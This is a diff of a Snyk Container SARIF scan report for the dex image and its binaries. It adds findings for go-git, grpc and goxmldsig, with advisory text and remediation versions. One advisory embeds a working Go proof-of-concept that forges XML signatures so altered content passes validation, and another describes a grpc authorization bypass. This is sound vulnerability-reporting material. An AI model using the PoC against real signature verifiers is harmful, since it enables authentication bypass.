@@ -6,8 +6,8 @@
       "tool": {
         "driver": {
           "name": "Snyk Container",
-          "semanticVersion": "1.1303.0",
-          "version": "1.1303.0",
+          "semanticVersion": "1.1303.2",
+          "version": "1.1303.2",
           "informationUri": "https://docs.snyk.io/",
           "properties": {
             "artifactsScanned": 16
@@ -966,18 +966,18 @@
         }
       ],
       "automationDetails": {
-        "id": "Snyk/Container/docker-image|ghcr.io/dexidp/dex/0/2026-03-01T15:15:52.540Z"
+        "id": "Snyk/Container/docker-image|ghcr.io/dexidp/dex/0/2026-04-04T17:52:10.882Z"
       }
     },
     {
       "tool": {
         "driver": {
           "name": "Snyk Container",
-          "semanticVersion": "1.1303.0",
-          "version": "1.1303.0",
+          "semanticVersion": "1.1303.2",
+          "version": "1.1303.2",
           "informationUri": "https://docs.snyk.io/",
           "properties": {
-            "artifactsScanned": 357
+            "artifactsScanned": 358
           },
           "rules": [
             {
@@ -1053,6 +1053,57 @@
                 ],
                 "cvssv3_baseScore": 8.7,
                 "security-severity": "8.7"
+              }
+            },
+            {
+              "id": "SNYK-GOLANG-GITHUBCOMGOGITGOGITV5PLUMBINGFORMATINDEX-15855220",
+              "shortDescription": {
+                "text": "Medium severity - Allocation of Resources Without Limits or Throttling vulnerability in github.com/go-git/go-git/v5/plumbing/format/index"
+              },
+              "fullDescription": {
+                "text": "(CVE-2026-34165) github.com/go-git/go-git/v5/plumbing/format/index@v5.2.0"
+              },
+              "help": {
+                "text": "",
+                "markdown": "## Overview\n\nAffected versions of this package are vulnerable to Allocation of Resources Without Limits or Throttling through the handling of `.idx` files. An attacker with write access to the local repository's `.git` directory can exhaust system memory by introducing a maliciously crafted `.idx` file into the `.git` directory.\n## Remediation\nUpgrade `github.com/go-git/go-git/v5/plumbing/format/index` to version 5.17.1 or higher.\n## References\n- [GitHub Advisory](https://github.com/go-git/go-git/security/advisories/GHSA-jhf3-xxhw-2wpp)\n- [GitHub Commit](https://github.com/go-git/go-git/commit/3ec0d70cb687ae1da5f4d18faa4229bd971a8710)\n- [GitHub Commit](https://github.com/go-git/go-git/commit/6b38a326816b80f64c20cc0e6113958b65c05a1c)\n"
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-191",
+                  "CWE-770",
+                  "gomodules"
+                ],
+                "cvssv3_baseScore": 6.9,
+                "security-severity": "6.9"
+              }
+            },
+            {
+              "id": "SNYK-GOLANG-GITHUBCOMGOGITGOGITV5PLUMBINGFORMATINDEX-15855246",
+              "shortDescription": {
+                "text": "Medium severity - Improper Validation of Array Index vulnerability in github.com/go-git/go-git/v5/plumbing/format/index"
+              },
+              "fullDescription": {
+                "text": "(CVE-2026-33762) github.com/go-git/go-git/v5/plumbing/format/index@v5.2.0"
+              },
+              "help": {
+                "text": "",
+                "markdown": "## Overview\n\nAffected versions of this package are vulnerable to Improper Validation of Array Index through improper validation in the index decoding for version 4 files. An attacker with write access to the `.git` directory to modify or inject the index file can cause a panic and terminate the process by supplying a maliciously crafted `.git/index` file that triggers an out-of-bounds slice operation during index parsing.\n## Remediation\nUpgrade `github.com/go-git/go-git/v5/plumbing/format/index` to version 5.17.1 or higher.\n## References\n- [GitHub Advisory](https://github.com/go-git/go-git/security/advisories/GHSA-gm2x-2g9h-ccm8)\n- [GitHub Commit](https://github.com/go-git/go-git/commit/e9b65df44cb97faeba148b47523a362beaecddf9)\n"
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-129",
+                  "gomodules"
+                ],
+                "cvssv3_baseScore": 6.9,
+                "security-severity": "6.9"
               }
             },
             {
@@ -1706,6 +1757,31 @@
               }
             },
             {
+              "id": "SNYK-GOLANG-GOOGLEGOLANGORGGRPC-15691172",
+              "shortDescription": {
+                "text": "Critical severity - Incorrect Authorization vulnerability in google.golang.org/grpc"
+              },
+              "fullDescription": {
+                "text": "(CVE-2026-33186) google.golang.org/grpc@v1.34.0"
+              },
+              "help": {
+                "text": "",
+                "markdown": "## Overview\n\nAffected versions of this package are vulnerable to Incorrect Authorization in the processing of HTTP/2 `:path` pseudo-headers in `handleStream()`. An attacker can gain unauthorized access to restricted resources by sending requests with malformed `:path` headers that omit the leading slash. This is only exploitable if the server uses path-based authorization interceptors, has deny rules that use canonical paths with leading slashes, and has a fallback allow rule in its policy.\r\n\r\n## Workaround \r\nThis vulnerability can be mitigated by adding a validating interceptor that rejects requests with malformed paths, configuring infrastructure (such as reverse proxies) to enforce strict HTTP/2 compliance, or switching to a default-deny authorization policy.\n## Remediation\nUpgrade `google.golang.org/grpc` to version 1.79.3 or higher.\n## References\n- [GitHub Commit](https://github.com/grpc/grpc-go/commit/72186f163e75a065c39e6f7df9b6dea07fbdeff5)\n"
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-863",
+                  "gomodules"
+                ],
+                "cvssv3_baseScore": 9.3,
+                "security-severity": "9.3"
+              }
+            },
+            {
               "id": "SNYK-GOLANG-GOOGLEGOLANGORGGRPC-5953328",
               "shortDescription": {
                 "text": "High severity - Denial of Service (DoS) vulnerability in google.golang.org/grpc"
@@ -1876,6 +1952,54 @@
               "logicalLocations": [
                 {
                   "fullyQualifiedName": "github.com/go-git/go-git/v5/plumbing@v5.2.0"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "ruleId": "SNYK-GOLANG-GITHUBCOMGOGITGOGITV5PLUMBINGFORMATINDEX-15855220",
+          "level": "warning",
+          "message": {
+            "text": "This file introduces a vulnerable github.com/go-git/go-git/v5/plumbing/format/index package with a medium severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/bin/gomplate"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "github.com/go-git/go-git/v5/plumbing/format/index@v5.2.0"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "ruleId": "SNYK-GOLANG-GITHUBCOMGOGITGOGITV5PLUMBINGFORMATINDEX-15855246",
+          "level": "warning",
+          "message": {
+            "text": "This file introduces a vulnerable github.com/go-git/go-git/v5/plumbing/format/index package with a medium severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/bin/gomplate"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "github.com/go-git/go-git/v5/plumbing/format/index@v5.2.0"
                 }
               ]
             }
@@ -2506,6 +2630,30 @@
           ]
         },
         {
+          "ruleId": "SNYK-GOLANG-GOOGLEGOLANGORGGRPC-15691172",
+          "level": "error",
+          "message": {
+            "text": "This file introduces a vulnerable google.golang.org/grpc package with a critical severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/bin/gomplate"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "google.golang.org/grpc@v1.34.0"
+                }
+              ]
+            }
+          ]
+        },
+        {
           "ruleId": "SNYK-GOLANG-GOOGLEGOLANGORGGRPC-5953328",
           "level": "error",
           "message": {
@@ -2603,18 +2751,18 @@
         }
       ],
       "automationDetails": {
-        "id": "Snyk/Container/github.com/hairyhenderson/gomplate/v3/1/2026-03-01T15:15:52.540Z"
+        "id": "Snyk/Container/github.com/hairyhenderson/gomplate/v3/1/2026-04-04T17:52:10.882Z"
       }
     },
     {
       "tool": {
         "driver": {
           "name": "Snyk Container",
-          "semanticVersion": "1.1303.0",
-          "version": "1.1303.0",
+          "semanticVersion": "1.1303.2",
+          "version": "1.1303.2",
           "informationUri": "https://docs.snyk.io/",
           "properties": {
-            "artifactsScanned": 220
+            "artifactsScanned": 221
           },
           "rules": [
             {
@@ -2690,6 +2838,31 @@
                 ],
                 "cvssv3_baseScore": 7.5,
                 "security-severity": "7.5"
+              }
+            },
+            {
+              "id": "SNYK-GOLANG-GITHUBCOMRUSSELLHAERINGGOXMLDSIG-15692488",
+              "shortDescription": {
+                "text": "High severity - Improper Verification of Cryptographic Signature vulnerability in github.com/russellhaering/goxmldsig"
+              },
+              "fullDescription": {
+                "text": "(CVE-2026-33487) github.com/russellhaering/goxmldsig@v1.1.0"
+              },
+              "help": {
+                "text": "",
+                "markdown": "## Overview\n[github.com/russellhaering/goxmldsig](https://github.com/russellhaering/goxmldsig) is a XML Digital Signatures implemented in pure Go.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature through the `validateSignature` function in the `validate.go` file. An attacker can bypass integrity checks and alter the contents of signed elements by exploiting pointer aliasing on a loop variable, allowing them to replace one element's contents with another referenced element's.\n## PoC\n```\r\npackage main\r\n\r\nimport (\r\n\t\"crypto/rand\"\r\n\t\"crypto/rsa\"\r\n\t\"crypto/tls\"\r\n\t\"crypto/x509\"\r\n\t\"encoding/base64\"\r\n\t\"fmt\"\r\n\t\"math/big\"\r\n\t\"time\"\r\n\r\n\t\"github.com/beevik/etree\"\r\n\tdsig \"github.com/russellhaering/goxmldsig\"\r\n)\r\n\r\nfunc main() {\r\n\tkey, err := rsa.GenerateKey(rand.Reader, 2048)\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\r\n\ttemplate := &x509.Certificate{\r\n\t\tSerialNumber: big.NewInt(1),\r\n\t\tNotBefore:    time.Now().Add(-1 * time.Hour),\r\n\t\tNotAfter:     time.Now().Add(1 * time.Hour),\r\n\t}\r\n\r\n\tcertDER, err := x509.CreateCertificate(rand.Reader, template, template, &key.PublicKey, key)\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\r\n\tcert, _ := x509.ParseCertificate(certDER)\r\n\r\n\tdoc := etree.NewDocument()\r\n\troot := doc.CreateElement(\"Root\")\r\n\troot.CreateAttr(\"ID\", \"target\")\r\n\troot.SetText(\"Malicious Content\")\r\n\r\n\ttlsCert := tls.Certificate{\r\n\t\tCertificate: [][]byte{cert.Raw},\r\n\t\tPrivateKey:  key,\r\n\t}\r\n\r\n\tks := dsig.TLSCertKeyStore(tlsCert)\r\n\tsigningCtx := dsig.NewDefaultSigningContext(ks)\r\n\r\n\tsig, err := signingCtx.ConstructSignature(root, true)\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\r\n\tsignedInfo := sig.FindElement(\"./SignedInfo\")\r\n\r\n\texistingRef := signedInfo.FindElement(\"./Reference\")\r\n\texistingRef.CreateAttr(\"URI\", \"#dummy\")\r\n\r\n\toriginalEl := etree.NewElement(\"Root\")\r\n\toriginalEl.CreateAttr(\"ID\", \"target\")\r\n\toriginalEl.SetText(\"Original Content\")\r\n\r\n\tsig1, _ := signingCtx.ConstructSignature(originalEl, true)\r\n\tref1 := sig1.FindElement(\"./SignedInfo/Reference\").Copy()\r\n\r\n\tsignedInfo.InsertChildAt(existingRef.Index(), ref1)\r\n\r\n\tc14n := signingCtx.Canonicalizer\r\n\r\n\tdetachedSI := signedInfo.Copy()\r\n\tif detachedSI.SelectAttr(\"xmlns:\"+dsig.DefaultPrefix) == nil {\r\n\t\tdetachedSI.CreateAttr(\"xmlns:\"+dsig.DefaultPrefix, dsig.Namespace)\r\n\t}\r\n\r\n\tcanonicalBytes, err := c14n.Canonicalize(detachedSI)\r\n\tif err != nil {\r\n\t\tfmt.Println(\"c14n error:\", err)\r\n\t\treturn\r\n\t}\r\n\r\n\thash := signingCtx.Hash.New()\r\n\thash.Write(canonicalBytes)\r\n\tdigest := hash.Sum(nil)\r\n\r\n\trawSig, err := rsa.SignPKCS1v15(rand.Reader, key, signingCtx.Hash, digest)\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\r\n\tsigVal := sig.FindElement(\"./SignatureValue\")\r\n\tsigVal.SetText(base64.StdEncoding.EncodeToString(rawSig))\r\n\r\n\tcertStore := &dsig.MemoryX509CertificateStore{\r\n\t\tRoots: []*x509.Certificate{cert},\r\n\t}\r\n\tvalCtx := dsig.NewDefaultValidationContext(certStore)\r\n\r\n\troot.AddChild(sig)\r\n\r\n\tdoc.SetRoot(root)\r\n\tstr, _ := doc.WriteToString()\r\n\tfmt.Println(\"XML:\")\r\n\tfmt.Println(str)\r\n\r\n\tvalidated, err := valCtx.Validate(root)\r\n\tif err != nil {\r\n\t\tfmt.Println(\"validation failed:\", err)\r\n\t} else {\r\n\t\tfmt.Println(\"validation ok\")\r\n\t\tfmt.Println(\"validated text:\", validated.Text())\r\n\t}\r\n}\r\n```\n## Remediation\nUpgrade `github.com/russellhaering/goxmldsig` to version 1.6.0 or higher.\n## References\n- [GitHub Commit](https://github.com/russellhaering/goxmldsig/commit/db3d1e31f7535d7f5debb49851b9e9a2ff08b936)\n"
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-347",
+                  "gomodules"
+                ],
+                "cvssv3_baseScore": 8.7,
+                "security-severity": "8.7"
               }
             },
             {
@@ -3018,6 +3191,31 @@
               }
             },
             {
+              "id": "SNYK-GOLANG-GOOGLEGOLANGORGGRPC-15691172",
+              "shortDescription": {
+                "text": "Critical severity - Incorrect Authorization vulnerability in google.golang.org/grpc"
+              },
+              "fullDescription": {
+                "text": "(CVE-2026-33186) google.golang.org/grpc@v1.39.0"
+              },
+              "help": {
+                "text": "",
+                "markdown": "## Overview\n\nAffected versions of this package are vulnerable to Incorrect Authorization in the processing of HTTP/2 `:path` pseudo-headers in `handleStream()`. An attacker can gain unauthorized access to restricted resources by sending requests with malformed `:path` headers that omit the leading slash. This is only exploitable if the server uses path-based authorization interceptors, has deny rules that use canonical paths with leading slashes, and has a fallback allow rule in its policy.\r\n\r\n## Workaround \r\nThis vulnerability can be mitigated by adding a validating interceptor that rejects requests with malformed paths, configuring infrastructure (such as reverse proxies) to enforce strict HTTP/2 compliance, or switching to a default-deny authorization policy.\n## Remediation\nUpgrade `google.golang.org/grpc` to version 1.79.3 or higher.\n## References\n- [GitHub Commit](https://github.com/grpc/grpc-go/commit/72186f163e75a065c39e6f7df9b6dea07fbdeff5)\n"
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-863",
+                  "gomodules"
+                ],
+                "cvssv3_baseScore": 9.3,
+                "security-severity": "9.3"
+              }
+            },
+            {
               "id": "SNYK-GOLANG-GOOGLEGOLANGORGGRPC-5953328",
               "shortDescription": {
                 "text": "High severity - Denial of Service (DoS) vulnerability in google.golang.org/grpc"
@@ -3138,6 +3336,30 @@
               "logicalLocations": [
                 {
                   "fullyQualifiedName": "github.com/prometheus/client_golang/prometheus/promhttp@v1.11.0"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "ruleId": "SNYK-GOLANG-GITHUBCOMRUSSELLHAERINGGOXMLDSIG-15692488",
+          "level": "error",
+          "message": {
+            "text": "This file introduces a vulnerable github.com/russellhaering/goxmldsig package with a high severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/bin/dex"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "github.com/russellhaering/goxmldsig@v1.1.0"
                 }
               ]
             }
@@ -3456,6 +3678,30 @@
           ]
         },
         {
+          "ruleId": "SNYK-GOLANG-GOOGLEGOLANGORGGRPC-15691172",
+          "level": "error",
+          "message": {
+            "text": "This file introduces a vulnerable google.golang.org/grpc package with a critical severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/bin/dex"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "google.golang.org/grpc@v1.39.0"
+                }
+              ]
+            }
+          ]
+        },
+        {
           "ruleId": "SNYK-GOLANG-GOOGLEGOLANGORGGRPC-5953328",
           "level": "error",
           "message": {
@@ -3505,7 +3751,7 @@
         }
       ],
       "automationDetails": {
-        "id": "Snyk/Container/github.com/dexidp/dex/2/2026-03-01T15:15:52.541Z"
+        "id": "Snyk/Container/github.com/dexidp/dex/2/2026-04-04T17:52:10.883Z"
       }
     }
   ]
